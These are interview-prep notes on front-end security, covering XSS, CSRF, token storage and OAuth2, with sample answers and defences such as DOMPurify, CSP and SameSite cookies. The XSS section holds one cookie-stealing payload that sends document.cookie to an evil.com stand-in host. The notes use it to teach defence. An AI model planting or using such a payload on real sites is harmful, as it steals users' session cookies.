# Front-End Security Notes — BNP Paribas Interview Prep

Focus topics: **XSS → CSRF → Access & Refresh Tokens**

---

## 1. XSS (Cross-Site Scripting)

### What it is
A hacker manages to run **their own JavaScript inside your app**, in the user's browser. Once it runs, it can steal tokens, make API calls as the user, or change what's on the screen.

### Example
A banking app has a comment box. Instead of a normal comment, the attacker types:

```html
<img src="x" onerror="fetch('https://evil.com?c=' + document.cookie)">
```

- Rendered with `innerHTML` / `dangerouslySetInnerHTML` → the browser treats it as real HTML. The image fails, `onerror` fires, and every user who views the comment sends their cookies to the attacker. **This is stored XSS.**
- Rendered the normal React way → shown as plain text. Nothing runs.

### Three types
| Type | How it happens |
|---|---|
| **Stored** | Script is saved in the database (e.g., a comment) and runs for everyone who views it |
| **Reflected** | Script comes in through a URL parameter and is echoed back onto the page |
| **DOM-based** | Your own front-end code writes untrusted input (e.g., `location.hash`) into the page via `innerHTML` |

### How React protects you
Anything inside curly braces is **escaped** — displayed as text, never executed.

```jsx
<p>{userComment}</p>   // ✅ Safe — React escapes it
```

### Where React is still vulnerable
1. **`dangerouslySetInnerHTML`** with untrusted data — skips React's escaping.
2. **Links built from user input** — `href="javascript:..."` runs code on click.
3. **Direct DOM access** — setting `innerHTML` through refs bypasses React.

### Key point
The danger is **untrusted data** (user input, URL params, user-generated API content) — not only data from external websites. Even data from your own backend is unsafe if a user originally typed it.

### Fixes
**DOMPurify** — a library that cleans HTML before rendering. It removes `<script>` tags, `onerror`/`onclick` handlers, and `javascript:` links, while keeping safe formatting like bold text and paragraphs.

```jsx
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(richText) }} />
```

**Validate URLs** — only allow links starting with `http://` or `https://`.

**Content Security Policy (CSP)** — a header the server sends telling the browser which sources may load scripts, styles, images, or API calls. Anything else is blocked, including injected inline scripts. It's the safety net: even if XSS slips through, the browser refuses to run it.

### 🎯 Interview answer
> "XSS happens when untrusted data, like user input or URL parameters, gets executed as code in the browser. React escapes everything rendered in curly braces by default, so the main risks are `dangerouslySetInnerHTML`, `javascript:` links, and setting `innerHTML` directly through refs. I prevent it by sanitising with DOMPurify, validating URLs, and adding a Content Security Policy as a second layer."

---

## 2. CSRF (Cross-Site Request Forgery)

> ⚠️ Don't confuse with **CORS** (Cross-Origin Resource Sharing) — a different concept.

### What it is
You're logged in to your bank in one tab, so the browser holds your session cookie. You open an evil website in another tab. That site quietly sends a request to the bank, e.g., "transfer money." **The browser automatically attaches your bank cookie**, so the bank thinks you made the request.

- The attacker does **not** inject a script into the bank.
- The evil site just sends a request; your browser adds the cookie on its own.

### XSS vs CSRF
| XSS | CSRF |
|---|---|
| Attacker's code runs **inside** your site | Attacker tricks your browser into sending a request **from another site** |

### Root cause
**The browser sends cookies automatically.** Every fix either stops that or catches it.

### Fixes
1. **SameSite cookies** — the cookie is only sent when the request comes from the bank's own website (Lax or Strict). It's about the *site*, not the tab. The evil site's request goes out without the cookie → rejected. *(Main modern defence.)*
2. **CSRF token** — the server gives the real page a secret random token; every request must include it. The evil site doesn't know it → the **server** rejects the request.
3. **Token in Authorization header** — the React app attaches the token (e.g., JWT) itself in the `Authorization` header. Browsers never add that header automatically, so the evil site has nothing to borrow.
   - Trade-off: the token now lives in JavaScript, so XSS protection matters even more.

### 🎯 Interview answer
> "CSRF works because the browser automatically attaches cookies, even on requests triggered by another site. I prevent it with SameSite cookies, CSRF tokens validated by the server, or by sending the auth token in the Authorization header instead of relying on cookies."

---

## 3. Access Token & Refresh Token

### Access token — the "day pass"
- Given after login; attached to **every API call** so the server knows who you are.
- **Short-lived**: usually 5–15 minutes, so a stolen one is useful only briefly.
- Sent in the `Authorization: Bearer <token>` header.

### Refresh token — the "key to get a new day pass"
- **Long-lived**: often days.
- Only ever sent to **one endpoint** — the refresh API.

### How it works
1. User logs in → server returns both tokens.
2. App calls APIs with the access token.
3. Access token expires → API returns **401 Unauthorized**.
4. App silently calls the refresh endpoint, gets a new access token, and **retries the original call**. The user notices nothing.
5. Refresh token expires (or user logs out) → user must log in again.

In React, step 4 is usually handled by an **Axios interceptor**.

### Where to store tokens
| Option | Pros | Cons |
|---|---|---|
| **localStorage** | Easy, survives refresh | Any JavaScript can read it → one XSS bug = token stolen ❌ |
| **HttpOnly cookie** | JavaScript can't read it → safe from XSS | It's a cookie, so needs CSRF protection |
| **Memory + refresh cookie** ✅ | Best practice in banking | Slightly more setup |

### Best-practice setup (banking)
- **Access token** → kept only in memory (JS variable / React state), sent in the Authorization header.
- **Refresh token** → stored in a cookie marked **HttpOnly, Secure, SameSite**.
- On page reload or expiry, the app quietly gets a new access token using the refresh cookie.

**Why it's secure**
- Access token isn't in localStorage → XSS has a hard time stealing it.
- Refresh cookie is HttpOnly + SameSite → hard to abuse via XSS or CSRF.

### 🎯 Interview answer
> "Avoid localStorage for sensitive tokens. I keep a short-lived access token in memory and send it in the Authorization header, and a long-lived refresh token in an HttpOnly, Secure, SameSite cookie. When the access token expires and the API returns 401, an Axios interceptor calls the refresh endpoint, gets a new token, and retries the request."

💡 **Use your SCB experience:** answer with real examples — *"In our banking app, we store the access token in memory and refresh it through an HttpOnly cookie."* Real experience beats textbook answers.

---

## 4. OAuth2 Login — Simple Picture

**Hotel analogy:** you don't get your room key from the room — you go to **reception**, show your ID, and get a key card.

- React app = the room
- Login server (Okta, Keycloak, Azure AD) = reception
- Token = key card

Flow: user clicks login → redirected to the login server → enters password **there** (your app never sees it) → sent back with a token → app uses the token for API calls.

---

## Quick Revision Card

| Topic | One-line summary |
|---|---|
| **XSS** | Hacker's script runs in your app. Curly braces are safe; `dangerouslySetInnerHTML` with untrusted data is not. Sanitise with DOMPurify + CSP. |
| **CSRF** | Evil site makes your browser send a request with your cookie. Fix: SameSite cookies, CSRF tokens, or token in Authorization header. |
| **Tokens** | Short-lived access token in memory; long-lived refresh token in HttpOnly, Secure, SameSite cookie. Avoid localStorage. |
| **CSP** | Server header telling the browser which script sources are allowed; blocks injected scripts. |
| **Cookies** | Central to CSRF — the attack works only because browsers send cookies automatically. |
